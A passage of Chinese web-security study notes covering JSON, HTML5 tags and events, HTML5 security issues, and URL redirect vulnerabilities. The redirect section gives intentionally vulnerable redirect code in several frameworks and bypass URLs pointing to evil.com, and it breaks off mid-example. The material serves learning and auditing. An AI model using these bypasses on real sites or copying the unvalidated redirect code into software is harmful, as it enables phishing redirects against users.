		<fruits>grape</fruits>
	</root>
```

#### <font color="yellow">003 JSON的解析和生成(JSON和JS对象互转)</font>

在JavaScript中，有两个方法与此相关

- `JSON.parse`
- `JSON.stringify`

JSON和JS对象互转

要实现从JSON字符串转换为JS对象，使用JSON.parse()方法

```javascript
<script>
	var str = '{"name": "兮动人","age":22}';
	var obj = JSON.parse(str);
	console.log(obj);
</script>
```

要实现从JS对象转换为JSON字符串，使用JSON.stringify()方法

```javascript
<script>
	var str = '{"name": "兮动人","age":22}';
	var obj = JSON.parse(str);
	console.log(obj);
	var jsonstr = JSON.stringify(obj);
	console.log(jsonstr);
</script>
```

#### <font color="yellow">004 JSON格式规定</font>

1. 对象(Object)

> 对象用大括号({})括起来，大括号里是一系列的名称/值对
> 
> 两个并列的数据之间用逗号(,)隔开，注意两点
> 
> 1. 使用英文的逗号(,)，不要用中文的逗号(，)
> 2. 最后一个名称/值对之后不要加逗号
> 
> [JSON在线检查语法https://www.json.cn/](https://www.json.cn/)	

2. 数组(Array)

> 数组表示一系列有序的值，用方括号([])包围起来，并列的值之间用逗号分隔
> 
> 以下的数组是合法的
> 
> ```json
> [1,2,"three","four",true,false,null,[1,2],{"name":"兮动人"}]
> ```

3. 名称/值对(Name/Value)

> 名称(Name)是一个字符串，要用双引号括起来，不能用单引号，也不能没有引号，这一点与JavaScript不同
> 
> 值的类型只有七种
> 
> - 字符串(string)
> - 数值(number)
> - 对象(object)
> - 数组(array)
> - true
> - false
> - null
> 
> 不能有这之外的类型，例如undefined、函数等

4. 字符串(string)的规则如下

> 英文双引号括起来,不能用单引号，也不能没有
> 
> 字符串中不能单独出现双引号(”)和右斜杠(\)
> 
> 如果要打双引号或右斜杠，需要使用右斜杠+字符的形式，例如\”和\\

5. 转义字符

> ```json
> {
> 	"string":"\\ \" "
> }
> ```

6. 数值类型，可以使用科学计数法表示

> ```json
> {
> 	"number":1e3,
> 	"n1":1e2,
> 	"n2":-100
> }
> ```

#### <font color="yellow">005 字符串转化成对象</font>

解析：是指将符合JSON语法规则的字符串转换成对象的过程，不同的编程语言都提供了解析JSON字符串的方法，在这里主要讲解JavaScript中的解析方法

主要有三种

- 使用`eval()`
- 使用`JSON.parse()`
- 使用第三方库，例如JQuery等

`eval()`函数的参数是一个字符串，其作用是直接执行其中的JavaScript代码

`eval()`解析字符串
```javascript
<script>
	var str = "console.log('hello')";
	eval(str);
</script>
```

`eval()`能够解析JSON字符串，从这里也可以看得出，JSON和JavaScript是高度嵌合的

`eval()`解析JSON字符串

```javascript
<script>
	var str = '{"name":"兮动人","age":22}';
	var obj = eval("("+str+")");
	console.log(obj)
</script>
```

但是，现在已经很少直接使用`eval()`来解析了，如果您的浏览器版本真的是很旧，可能才需要这个方法

此外，`eval()`是一个相对危险的函数，因为字符串中可能含有未知因素

在这里，作为学习，还是要知道这也是一种方法

请注意`eval()`的参数，在字符串两旁加了括号，这是必须的，否则会报错

因为JSON字符串是被大括号({})包围的，直接放到`eval()`会被当成语句块来执行，因此要在两旁加上括号，使其变成表达式

`JSON. parse()`

现在绝大多数浏览器都以支持`JSON.parse()`，是推荐使用的方式

如果输入了不符合规范的字符串，会报错

JSON字符串转换为JS对象

```javascript
<script>
	var str = '{"name":"兮动人","age":22}';
	var obj = JSON.parse(str)
	console.log(obj)
</script>
```

`JSON.parse()`可以有第二个参数，是一个函数

此函数有两个参数

- name
- value

分别代表名称和值

当传入一个JSON字符串后，JSON的每一组名称/值对都要调用此函数

该函数有返回值，返回值将赋值给当前的名称(name)

利用第二个参数，可以在解析JSON字符串的同时对数据进行一些处理

```javascript
<script>
	var str = '{"name":"兮动人","age":22}';
	var obj = JSON.parse(str,fun);
	function fun(name,value){
		console.log(name+":"+value);
		return value
	}
	console.log(obj)
</script>
```

可以做判断处理，当JSON字符串的`name=age`时，设置age的`value=14`

```javascript
<script>
	var str = '{"name":"兮动人","age":22}';
	var obj = JSON.parse(str,fun);
	function fun(name,value){
	if (name == "age")
		value = 14;
		return value
	}
 	console.log(obj)
</script>
```

#### <font color="yellow">006 JS对象转化为字符串</font>

序列化，指将JavaScript值转化为JSON字符串的过程

`JSON.stringify()`能够将JavaScript值转换成JSON字符串

`JSON.stringify()`生成的字符串可以用`JSON.parse()`再还原成JavaScript值

参数的含义

```javascript
JSON.stringify(value[, replacer[, space]])
```

- value

	必选参数

	被变换的JavaScript值，一般是对象或数组

- replace

	可以省略

	有两种选择

	- 函数
	- 数组

如果是函数，则每一组名称/值对都会调用此函数，该函数返回一个值，作为名称的值变换到结果字符串中，如果返回`undefined`，则该成员被忽略

```javascript
<script>
        var obj = {
            name: "兮动人",
            age: 22
        };
        console.log(obj);
        var jsonstr = JSON.stringify(obj,fun);
        function fun(name,value) {
            if (name=="age")
                value = 18;
                return value;
         }
        console.log(jsonstr)
</script>
```

如果是数组，则只有数组中存在名称才能够被转换，且转换后顺序与数组中的值保持一致

```javascript
<script>
        var obj = {
            a: 1,
            b: 2,
            c: 3,
            d: 4
        };
        console.log(obj);
        var jsonstr = JSON.stringify(obj,["a","b","c"]);
        console.log(jsonstr)
</script>
```

把顺序改下，对应转换的JSON字符串的数值不变

```javascript
var jsonstr = JSON.stringify(obj,["c","a","b"]);
```

space：可以省略，这是为了排版、方便阅读而存在的，可以在JSON字符串中添加空白或制表符等

value的用法

```javascript
<script>
var obj = {
            name: "兮动人",
            age: 22
        }
	console.log(obj);
	var jsonstr = JSON.stringify(obj);
	console.log(jsonstr)
</script>
```

当有不符合JSON语法规则时，就不会被转换成JSON字符串

数组中有函数时会被转换成null

```javascript
<script>
	var obj = {
            name: "兮动人",
            age: 22,
            a: undefined,
            f: function () {
            },
            b:[function () {}]
        }
	console.log(obj);
	var jsonstr = JSON.stringify(obj);
	console.log(jsonstr)        
</script>
```

replace的用法

space的用法

在上面的基础上添加

```javascript
<script>
        var obj = {
            a: 1,
            b: 2,
            c: 3,
            d: 4
        };
        console.log(obj);
        var jsonstr = JSON.stringify(obj,["c","a","b"],"one");
        console.log(jsonstr)
</script>
```

改成制表符：`\t`

```javascript
<script>
        var obj = {
            a: 1,
            b: 2,
            c: 3,
            d: 4
        };
        console.log(obj);
        var jsonstr = JSON.stringify(obj,["c","a","b"],"\t");
        console.log(jsonstr)
</script>
```

### <font color="yellow">06 HTML5安全</font>

#### <font color="yellow">001 浏览器支持</font>

微软MIX10技术大会上宣布其推出的IE9浏览器已经支持HTML5

Mozilla基金会发布了即将推出的Firefox4浏览器的第一个早期测试版，该版本中Firefox浏览器中进行了大幅改进，包括新的HTML5语法分析器，以及支持更多的HTML5语法分析器，以及支持更多的HTML5形式的控制等，从官方文档来看，Firefox4对HTML5是完全级别的支持

谷歌Gears项目经理通过微博宣布，谷歌将放弃对Gears浏览器插件项目的支持，以重点开发HTML5项目，目前在谷歌看来，Gears应用用于HTML5的诸多创新非常相似，并且谷歌一直积极发展HTML5项目，因此只要谷歌不断以加强网络标准的应用功能为工作重点，那么为Gears增加新功能就无太大意义了，另外，Gears面临的需求也在日益下降，这也是谷歌做出吊证的重要原因

苹果在开发者发布会公布Safari5，这款浏览器支持10个以上的HTML5新技术，包括全屏幕播放、HTML5视频、HTML5地理位置、HTML5切片元素、HTML5的可拖动属性、HTML5的形式验证、HTML5的Ruby、HTML5的Ajaxl.ishi和WebSocket字幕

Opera软件公司首席技术官，号称“CSS之父”的Hakon Wium Lie认为，HTML5和CSS3，将会是全球互联网发展的未来趋势，包括目前Opera在内的诸多浏览器厂商，纷纷研发HTML5的相关产品，web未来属于HTML5

#### <font color="yellow">002 开发工具</font>

Notepad++ [https://notepad-plus-plus.org/](https://notepad-plus-plus.org/)

Visual Studio Code [https://code.visualstudio.com/](https://code.visualstudio.com/)

HBuilderX [https://www.dcloud.io/hbuilderx.html](https://www.dcloud.io/hbuilderx.html)

Dreamweaver(收费) [https://www.adobe.com/cn/products/dreamweaver.html](https://www.adobe.com/cn/products/dreamweaver.html)
	
Sublime Text(收费) [http://www.sublimetext.com/](http://www.sublimetext.com/)

Webstorm(收费) [https://www.jetbrains.com/webstorm/](https://www.jetbrains.com/webstorm/)

#### <font color="yellow">003 HTML5语法</font>

1. 基本结构
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title> </title>
</head>
<body>

</body>
</html>
```

2. 语法规范

> HTML5中不区分大小写，但是我们一般都使用小写
> 
> HTML5中的注释不能嵌套
> 
> HTML5标签必须结构完整，要么成对出现，要么自结束标签
> 
> HTML5标签可以嵌套，但是不能交叉嵌套
> 
> HTML5标签中的属性必须有值，且值必须加引号(双引号单引号都可以)
> 

3. 标签规范

单标签

```html
<标签名 [属性名=属性值,...]>
```

标签对

```html
<标签名 [属性名=属性值,...]></标签名>
```

#### <font color="yellow">004 HTMl5标签</font>

##### <font color="yellow">0001 标题标签</font>

```html
<h1>这是一级标题</h1>
<h2>这是二级标题</h2>
<h3>这是三级标题</h3>
<h4>这是四级标题</h4>
<h5>这是五级标题</h5>
<h6>这是六级标题</h6>
```

##### <font color="yellow">0002 段落标签</font>

```html
<p>这是一个段落</p>
```

##### <font color="yellow">0003 链接标签</font>

```html
<a href="https://www.baidu.com">打开百度，你就知道！</a>
```
常见属性

|属性|值|描述|
|-|-|-|
|href|URL|规定链接的目标URL|
|target|_blank、_parent、_self、_top、framename|规定链接在何处打开目标URL(仅在href属性存在时使用)|

##### <font color="yellow">0004 图像标签</font>

```html
<img src="https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png" alt="百度LOGO">
```

##### <font color="yellow">0005 表格标签</font>

```html
<table border="1px" cellpadding="0px" cellspacing="0px">
    <tr>
        <th>表头一</th>
        <th>表头二</th>
        <th>表头三</th>
        <th>表头四</th>
    </tr>
    <tr>
        <td>单元格一</td>
        <td>单元格二</td>
        <td>单元格三</td>
        <td>单元格四</td>
    </tr>
</table>
```

##### <font color="yellow">0006 列表标签</font>

1. 无序列表

```html
<ul>
    <li>列表项</li>
    <li>列表项</li>
    <li>列表项</li>
    <li>列表项</li>
</ul>
```

2. 有序列表

```html
<ol>
    <li>列表项</li>
    <li>列表项</li>
    <li>列表项</li>
    <li>列表项</li>
</ol>
```

3. 自定义列表

```html
<dl>
    <dt>+</dt><dd>列表项</dd>
    <dt>+</dt><dd>列表项</dd>
    <dt>+</dt><dd>列表项</dd>
</dl>
```

##### <font color="yellow">0007 分组标签</font>

```html
<div>具体内容</div>
```

```html
<span>具体内容</span>
```

##### <font color="yellow">0008 语义标签</font>

常见标签

- `<header>`，规定文档或节的页眉
- `<footer>`，定义文档或节的页脚
- `<main>`，规定文档的主内容
- `<section>`，定义文档的节
- `<article>`，定义文档的文章
- `<aside>`，定义页面内容以外的内容
- `<nav>`，定义导航链接
- `<mark>`，定义重要的或强调的文本
- `<figure>`，规定自包含内容
- `<figcaption>`，定义`<figure>`元素的标题
- `<details>`，定义用户能够查找或隐藏的额外细节
- `<summary>`，定义`<details>`元素的可见标题
- `<time>`，定义时间

基本布局

- `<header>`
- `<nav>`
- `<section>`
- `<aside>`
- `<article>`
- `<footer>`

##### <font color="yellow">表单标签</font>

常见标签
- `<from>`，定义供用户输入的表单
- `<input>`，定义输入域
- `<label>`，定义了`<input>`元素的标签，一般为输入标题
- `<textarea>`，定义文本域 (一个多行的输入控件)
- `<fieldset>`，定义了一组相关的表单元素，并使用外框包含起来
- `<legend>`，定义了`<fieldset>`元素的标题
- `<select>`，定义了下拉选项列表
- `<optgroup>`，定义选项组
- `<option>`，定义下拉列表中的选项
- `<button>`，定义一个点击按钮
- `<datalist>`，指定一个预先定义的输入控件选项列表
- `<keygen>`，指定一个预先定义的输入控件选项列表
- `<output>`，定义一个计算结果

演示

form、input、label演示

```html
<form action="" method="get">
    <p>
        <label for="username">账户：</label>
        <input type="text" name="username" id="username">
    </p>
    <p>
        <label for="password">密码：</label>
        <input type="password" name="password" id="password">
    </p>
    <p><input type="submit"></p>
</form>
```

textarea演示

```html
<form action="" method="post">
    <textarea name="mycontext" cols="30" rows="10"></textarea>
    <input type="submit">
</form>
```

fieldset、legend、select、optgroup、option演示

```html
<form action="" method="post">
    <fieldset>
        <legend>请选择你的爱好：</legend>

        <select name="myhobby" id="myhobby">
            <optgroup label="运动">
                <option value="篮球">篮球</option>
                <option value="足球">足球</option>
            </optgroup>
            <optgroup label="电子">
                <option value="看电影">看电影</option>
                <option value="看电视">看电视</option>
            </optgroup>
        </select>
    </fieldset>
</form>
```

datalist演示

```html
<form action="" method="post">
    <input list="browsers">
    <datalist id="browsers">
        <option value="Internet Explorer">
        <option value="Firefox">
        <option value="Chrome">
        <option value="Opera">
        <option value="Safari">
    </datalist>
</form>
```

单选框演示

```html
<form action="" method="post">
    <input type="radio" name="sex" id="male" value="male" checked>
    <label for="male">Male</label>

    <input type="radio" name="sex" id="female" value="female">
    <label for="female">female</label>
</form>
```

复选框演示

```html
<form action="" method="post">
    <input type="checkbox" name="vehicle" id="bike" value="bike">
    <label for="bike">I have a bike</label>

    <input type="checkbox" name="vehicle" id="car" value="car">
    <label for="car">I have a car</label>
</form>
```

框架标签

```html
<iframe src="https://www.baidu.com" frameborder="0" width="500px" height="500px"></iframe>
```

音频标签

```html
<audio controls>
    <source src="horse.ogg" type="audio/ogg">
    <source src="horse.mp3" type="audio/mpeg">
    您的浏览器不支持 Audio 标签
</audio>
```

视频标签

```html
<video width="320" height="240" controls>
	<source src="movie.mp4" type="video/mp4">
	<source src="movie.ogg" type="video/ogg">
	您的浏览器不支持 Video 标签
</video>
```

其他标签

- 水平线：`<hr>`
- 换行：`<br>`
- `<b>粗体文本</b>`
- `<code>计算机代码</code>`
- `<em>强调文本</em>`
- `<i>斜体文本</i>`
- `<kbd>键盘输入</kbd>`
- `<pre>预格式化文本</pre>`
- `<small>更小的文本</small>`
- `<strong>重要的文本</strong>`
- `<abbr>缩写词或者首字母缩略词</abbr>`
- `<address>联系信息</address>`
- `<bdo>文字方向</bdo>`
- `<blockquote>从另一个源引用的部分</blockquote>`
- `<cite>工作的名称</cite>`
- `<del>删除的文本</del>`
- `<ins>插入的文本</ins>`
- `<sub>下标文本</sub>`
- `<sup>上标文本</sup>`

头部标签
- `<head>`，定义了文档的信息
- `<title>`，定义了文档的标题
- `<base>`，定义了页面链接标签的默认链接地址
- `<link>`，定义了一个文档和外部资源之间的关系
- `<meta>`，定义了HTML文档中的元数据
- `<script>`，定义了客户端的脚本文件
- `<style>`，定义了HTML文档的样式文件

#### <font color="yellow">005 HTML5属性</font>

HTML5标签可以设置属性，属性总是以名称/值对的形式出现，如name=value，它的主要作用是控制或修饰标签

通用属性

- `accesskey`，设置访问元素的键盘快捷键
- `class`，规定元素的类名(`classname`)
- `contenteditable`，规定是否可编辑元素的内容
- `contextmenu`，指定一个元素的上下文菜单，当用户右击该元素，出现上下文菜单
- `data-*`，用于存储页面的自定义数据
- `dir`，设置元素中内容的文本方向
- `draggable`，指定某个元素是否可以拖动
- `dropzone`，指定是否将数据复制，移动，或链接，或删除
- `hidden`，`hidden`属性规定对元素进行隐藏
- `id`，规定元素的唯一`id`
- `lang`，设置元素中内容的语言代码
- `spellcheck`，检测元素是否拼写错误
- `style`，规定元素的行内样式(inline style)
- `tabindex`，设置元素的 Tab 键控制次序
- `title`，规定元素的额外信息(可在工具提示中显示)
- `translate`，指定是否一个元素的值在页面载入时是否需要翻译

#### <font color="yellow">006 HTML5事件</font>
		
HTML5事件可以触发浏览器中的行为，比方说当用户点击某个 HTML 元素时启动一段 JavaScript

##### <font color="yellow">0001 窗口事件</font>

由窗口触发该事件(同样适用于`<body>`标签)

|属性|值|描述|
|-|-|-|
|onafterprint|script|在打印文档之后运行脚本|
|onbeforeprint|script|在文档打印之前运行脚本|
|onbeforeonload|script|在文档加载之前运行脚本|
|onblur|script|当窗口失去焦点时运行脚本|
|onerror|script|当错误发生时运行脚本|
|onfocus|script|当窗口获得焦点时运行脚本|
|onhashchange|script|当文档改变时运行脚本|
|onload|script|当文档加载时运行脚本|
|onmessage|script|当触发消息时运行脚本|
|onoffline|script|当文档离线时运行脚本|
|ononline|script|当文档上线时运行脚本|
|onpagehide|script|当窗口隐藏时运行脚本|
|onpageshow|script|当窗口可见时运行脚本|
|onpopstate|script|当窗口历史记录改变时运行脚本|
|onredo|script|当文档执行再执行操作(redo)时运行脚本|
|onresize|script|当调整窗口大小时运行脚本|
|onstorage|script|当Web Storage区域更新时(存储空间中的数据发生变化时)运行脚本|
|onundo|script|当文档执行撤销时运行脚本|
|onunload|script|当用户离开文档时运行脚本|

##### <font color="yellow">0002 表单事件</font>

表单事件在HTML表单中触发(适用于所有 HTML 元素，但该HTML元素需在form表单内)

|属性|值|描述|
|-|-|-|
|onblur|script|当元素失去焦点时运行脚本|
|onchange|script|当元素改变时运行脚本|
|oncontextmenu|script|当触发上下文菜单时运行脚本|
|onfocus|script|当元素获得焦点时运行脚本|
|onformchange|script|当表单改变时运行脚本|
|onforminput|script|当表单获得用户输入时运行脚本|
|oninput|script|当元素获得用户输入时运行脚本|
|oninvalid|script|当元素无效时运行脚本|
|onselect|script|当选取元素时运行脚本|
|onsubmit|script|当提交表单时运行脚本|

##### <font color="yellow">0003 键盘事件</font>

通过键盘触发事件，类似用户的行为

|属性|值|描述|
|-|-|-|
|onkeydown|script|当按下按键时运行脚本|
|onkeypress|script|当按下并松开按键时运行脚本|
|onkeyup|script|当松开按键时运行脚本|

##### <font color="yellow">0004 鼠标事件</font>

通过鼠标触发事件，类似用户的行为

|属性|值|描述|
|-|-|-|
|onclick|script|当单击鼠标时运行脚本|
|ondblclick|script|当双击鼠标时运行脚本|
|ondrag|script|当拖动元素时运行脚本|
|ondragend|script|当拖动操作结束时运行脚本|
|ondragenter|script|当元素被拖动至有效的拖放目标时运行脚本|
|ondragleave|script|当元素离开有效拖放目标时运行脚本|
|ondragover|script|当元素被拖动至有效拖放目标上方时运行脚本|
|ondragstart|script|当拖动操作开始时运行脚本|
|ondrop|script|当被拖动元素正在被拖放时运行脚本|
|onmousedown|script|当按下鼠标按钮时运行脚本|
|onmousemove|script|当鼠标指针移动时运行脚本|
|onmouseout|script|当鼠标指针移出元素时运行脚本|
|onmouseover|script|当鼠标指针移至元素之上时运行脚本|
|onmouseup|script|当松开鼠标按钮时运行脚本|
|onmousewheel|script|当转动鼠标滚轮时运行脚本|
|onscroll|script|当滚动元素的滚动条时运行脚本|

##### <font color="yellow">0005 媒体事件</font>

通过视频(videos)，图像(images)或音频(audio)触发该事件，多应用于HTML媒体元素比如：`<embed>`，`<object>`，`<img>`，`<audio>`和`<video>`
|属性|值|描述|
|-|-|-|
|onabort|script|当发生中止事件时运行脚本|
|oncanplay|script|当媒介能够开始播放但可能因缓冲而需要停止时运行脚本|
|oncanplaythrough|script|当媒介能够无需因缓冲而停止即可播放至结尾时运行脚本|
|ondurationchange|script|当媒介长度改变时运行脚本|
|onemptied|script|当媒介资源元素突然为空时(网络错误、加载错误等)运行脚本|
|onended|script|当媒介已抵达结尾时运行脚本|
|onerror|script|当在元素加载期间发生错误时运行脚本|
|onloadeddata|script|当加载媒介数据时运行脚本|
|onloadedmetadata|script|当媒介元素的持续时间以及其他媒介数据已加载时运行脚本|
|onloadstart|script|当浏览器开始加载媒介数据时运行脚本|
|onpause|script|当媒介数据暂停时运行脚本|
|onplay|script|当媒介数据将要开始播放时运行脚本|
|onplaying|script|当媒介数据已开始播放时运行脚本|
|onprogress|script|当浏览器正在取媒介数据时运行脚本|
|onratechange|script|当媒介数据的播放速率改变时运行脚本|
|onreadystatechange|script|当就绪状态(ready-state)改变时运行脚本|
|onseeked|script|当媒介元素的定位属性不再为真且定位已结束时运行脚本|
|onseeking|script|当媒介元素的定位属性为真且定位已开始时运行脚本|
|onstalled|script|当取回媒介数据过程中(延迟)存在错误时运行脚本|
|onsuspend|script|当浏览器已在取媒介数据但在取回整个媒介文件之前停止时运行脚本|
|ontimeupdate|script|当媒介改变其播放位置时运行脚本|
|onvolumechange|script|当媒介改变音量亦或当音量被设置为静音时运行脚本|
|onwaiting|script|当媒介已停止播放但打算继续播放时运行脚本|
	
##### <font color="yellow">0006 其他事件</font>

|属性|值|描述|
|-|-|-|
|onshow|script|当`<menu>`元素在上下文显示时触发|
|ontoggle|script|当用户打开或关闭`<details>`元素时触发|

#### <font color="yellow">007 HTML5新标签</font>

HTML5是W3C制定的新一代HTML语言的标准，这个标准现在还在不断地修改，但是主流的浏览器厂商都已经开始逐渐支持这些新功能，离HTML5真正的普及还有很长一段路要走，但是由于浏览器已经开始支持部分功能，所以HTML5的影响已经显现，可以预见到，在移动互联网领域，HTML5会有着广阔的发展前景

#### <font color="yellow">008 新标签的XSS</font>

HTML5中定义了很多新标签、新事件，可能导致新的XSS攻，一些XSS Filter如果建立一个黑名单的话，则可能就不会覆盖到HTML5新增的标签和功能，从而避免产生XSS，HTML5中新增的一些标签和属性，使得XSS等Web攻击产生了新的变化，为了总结这些变化，安全研究者建立了一个HTML5 Security Cheatsheet项目[http://code.google.com/p/html5security](http://code.google.com/p/html5security)

#### <font color="yellow">009 iframe的sandbox</font>

`<iframe>`标签一直以来都为人所诟病，挂马、XSS、ClickJacking等都需运用它，在HTML5中，专门为iframe定义了一个新的属性----sandbox使用sandbox属性后，`<iframe>`标签加载的内容将被视为一个独立的源，其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，只想其他浏览对象的链接也会被禁止

sandbox属性可以通过参数来支持更精确的控制，有以下几个值可以选择：

- allow-same-origin，允许同源访问
- allow-top-navigation，允许防伪顶层窗口
- allow-forms，允许提交表单
- allow-scripts，允许执行脚本

可是有的行为即便是设置了allow-scripts，也是不允许的，如弹出窗口

#### <font color="yellow">010 Link Types：noreferrer</font>

在HTML5中，为`<a>`、`<area>`这两个标签定义了一个新的Link Types----noreferrer

标签指定了noreferrer后，浏览器在请求该标签指定的地址是将不再发送Referer，这种设计是出于保护敏感信息和隐私的考虑，因为通过Referer，可能会泄露一些敏感信息，这个标签需要开发者手动添加到页面的标签中，对于有需要的标签可以选择使用noreferrer

#### <font color="yellow">011 Canvas的妙用</font>

Canvas是HTML5的最大创新之一，`<canvas>`标签让JavaScript可以在页面中直接操作图片对象，也可以直接操作像素，构造出图片区域，Canvas的出现极大的挑战了传统富客户端插件的地位，开发者甚至可以通过Canvas在浏览器上写一个小游戏

以下浏览器中，开始支持`<canvas>`标签

- IE 7+
- Firefox 3.0+
- Safari 3.0+
- Chrome 3.0+
- Opera 10.0+
- iPhone 1.0+
- Android 1.0+

Dive Into HTML5很好地介绍了Canvas及其他HTML5的特性，[http://diveintohtml.info/canvas.html](http://diveintohtml.info/canvas.html)

Canvas提供的强大功能，甚至可以破解验证码，Shaun Firedle写了一个GreaseMonkey的脚本，通过操作Canvas中的每一个像素点，成功地识别了Megaupload提供的验证码，[http://userscript.org/scripts/review/38736](http://userscript.org/scripts/review/38736)

HTML5使过去难以做到的事情变得可能

#### <font color="yellow">012 其他安全问题</font>

##### <font color="yellow">0001 Cross-Origin Resource Sharing</font>

> 浏览器实现的同源策略限制了脚本的跨域请求，但互联网的发展趋势是越来越开放的，因此跨域访问的需求也变得越来越迫切，同源策略给Web开发者带来了很多困扰，他们不得不想方设法地实现一些合法的跨域技术，由此诞生了jsonp、iframe跨域等技巧，W3C委员会决定制定一个新的标准来解决日益迫切的跨域访问问题，[http://www.w3.org/TR/cors/](http://www.w3.org/TR/cors/)，Origin Header用于标记HTTP发起的源，服务器端通过识别浏览器自动带上端这个Origin Header，来判断浏览器的请求是否来自一个合法的源，Origin Header可以用于防范CSRF，它不像Referer那么容易被伪造或清空

##### <font color="yellow">0002 postMessage——跨窗口传递信息</font>
跨站脚本攻击中提到`window.name`几乎不受同源策略限制，<font color="red">postMessage允许每一个window对象往其他的窗口发送本地信息，从而实现跨窗口的消息传递，这个功能是不受同源策略限制的</font>

使用时的注意事项

- 在必要时，可以接收窗口验证Oomain，甚至验证URL，以防来自非法页面的消息，这实际上是在代码中实现一次同源策略的验证过程
- 如果将消息写入innerHTML，甚至直接写入script中，可能导致DOM型XSS产生，根据Secure By Default原则，在接受窗口不应该信任接收到的消息，需要对消息进行安全检查

使用postMessage也会让XSS Payload变得更加灵活，Gareth Heyes曾经实现过一个JavaScript运行环境的sandbox，其原理是创建一个iframe，将JavaScript限制于其中执行，但通过研究发现，利用postMessage()给父窗口发消息可以突破sandbox
	
##### <font color="yellow">0003 Web Storage</font>

过去浏览器的储存方式哟有以下几种

- Cookie：主要用于保存登录凭证和少量信息
- Flash Shared Object：是Adobe自己的功能
- IE UserData：是微软自己的功能

W3C委员会希望能在客户端有一个强大和方便的本地储存功能，就是Web Storage

Web Storage分为Session Storage和Local Storage

- Session Storage：关闭浏览器就会失效
- Local Storage：会一直存在

Web Storage就像一个非关系型数据库，由Key - Value对组成，可以通过JavaScript对其进行操作

```javascript
设置一个值 = window.sessionStorage.setItem(key,value)
读取一个值 = window.sessionStorage.getItem(key)
```

Web Storage也收到同源策略的约束，每个域所拥有的信息只会保存在自己的域下，Web Storage让Web开发更加灵活多变，它的强大功能也为XSS Payload打开方便之门，攻击者有可能将恶意代码保存在Web Storage中，从而实现跨页面攻击，当Web Storage存有敏感信息时，也可能成为攻击目标，而XSS攻击正好能够实现这一过程，可以预见，Web Storage会被越来越多的开发者所接受，也会带来更多安全挑战

#### <font color="yellow">013 总结</font>

HTML5是互联网未来的大势所趋，虽然目前距离全面普及还有很长的路要走，但随着浏览器开始支持越来越多的HTML5功能攻击面也随之产生了新的变化，攻击者有可能利用HTML5的特性，来绕过未及时更新的防御方案，要对抗这些新型的攻击，就必须了解HTML5的方方面面，对与HTML5来说，在移动互联网的普及进程可能会快一些，因此未来HTML5攻防的主战场，很可能会发生在移动互联网上

### <font color="yellow">07 URL跳转漏洞</font>

借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题，即黑客构建恶意链接(链接需要进行伪装,尽可能迷惑)，发在QQ群或者是浏览量多的贴吧/论坛中

对抗手法

> Referer限制，确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接，加入有效性验证Token，保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制

#### <font color="yellow">001 漏洞场景</font>

URL跳转漏洞的出现场景还是很杂的，出现漏洞的原因主要有以下5个

- 写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞
- 写代码时考虑不周，用取子串、取后缀等方法简单判断，代码逻辑可被绕过
- 对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过
- 原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性，可被绕过
- 原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过

在没有分清楚具体场景时，一味的堆积姿势常常是费力不讨好

总结完常见的漏洞场景，就可以根据总结情况，写个脚本，生成所有可能的payload，再放到工具(如burpsuite)里批量尝试，既省事，又不会人为遗漏

由于不同语言对HTTP协议的实现和跳转函数的实现不一致，所以可能会出现对某种语言或框架特定的利用方式

漏洞通常发生在以下几个地方

- 用户登录、统一身份认证处，认证完后会跳转
- 用户分享、收藏内容过后，会跳转
- 跨站点认证、授权后，会跳转
- 站内点击其它网址链接时，会跳转

常见的参数名

- redirect
- redirect_to
- redirect_url
- url
- jump
- jump_to
- target
- to
- link
- linkto
- domain

几种语句和框架版本常见的URL跳转代码如下，可用作白盒代码审计参考
- Java

```java
response.sendRedirect(request.getParameter("url"));
```

- php

```php
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);
```

- .NET

```c#
string redirect_url = request.QueryString["url"];
Response.Redirect(redirect_url);
```

- Django

```python
redirect_url = request.GET.get("url")
HttpResponseRedirect(redirect_url)
```

- Flask

```python
redirect_url = request.form['url']
redirect(redirect_url)
```

- Rails

```ruby
redirect_to params[:url]
```

#### <font color="yellow">002 利用方法</font>

后面假设源域名为：`www.landgrey.me`要跳转过去的域为：`evil.com`

##### <font color="yellow">0001 直接跳转</font>

没做任何限制，参数后直接跟要跳转过去的网址就行`https://www.landgrey.me/redirect.php?url=http://www.evil.com/untrust.html`

##### <font color="yellow">0002 协议一致性</font>

当程序员校验跳转的网址协议必须为https时(有时候跳转不过去不会给提示)`https://www.landgrey.me/redirect.php?url=https://www.evil.com/untrust.html`

##### <font color="yellow">0003 域名字符串检测欺骗</font>

-  有的程序员会检测当前的域名字符串是否在要跳转过去的字符串中，是子字符串时才会跳转，php代码

```php
<?php
$redirect_url = $_GET['url'];
if(strstr($redirect_url,"www.landgrey.me") !== false)
{
    header("Location: " . $redirect_url);
}
else
{
    die("Forbidden");
}
```

绕过

`https://www.landgrey.me/redirect.php?`
`url=http://www.landgrey.me.www.evil.com/untrust.html`

- 还有的会检测域名结尾是不是当前域名，是的话才会跳转，Django示例代码如下

```python
redirect_url = request.GET.get("url")
if redirect_url.endswith('landgrey.me'):
    HttpResponseRedirect(redirect_url)
else:
		HttpResponseRedirect("https://www.landgrey.me")
```

绕过

`https://www.landgrey.me/redirect.php?url=http://www.evil.com/www.landgrey.me`

买个xxxlandgrey.me域名，然后绕过

`https://www.landgrey.me/redirect.php?url=http://xxxlandgrey.me`

- 可信站多次重定向绕过
利用已知可重定向到自己域名的可信站点的重定向，来最终重定向自己控制的站点

一种是利用程序自己的公共白名单可信站点，如www.baidu.com，其中百度有个搜索的缓存链接比如`https://www.baidu.com/linkurl=iMwwNDM6ahaxKkSFuOG`，可以最终跳转到自己网站，然后测试时

`https://www.landgrey.me/redirect.php?`

